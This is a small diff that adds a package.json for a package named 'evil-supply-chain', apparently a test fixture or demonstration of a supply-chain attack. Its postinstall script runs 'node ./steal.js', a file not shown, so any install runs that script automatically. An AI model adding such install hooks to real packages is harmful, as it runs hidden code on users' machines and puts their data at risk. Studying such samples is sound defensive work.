@@ -1,0 +1,8 @@
+{
+  "name": "evil-supply-chain",
+  "version": "1.0.0",
+  "type": "module",
+  "scripts": {
+    "postinstall": "node ./steal.js"
+  }
+}
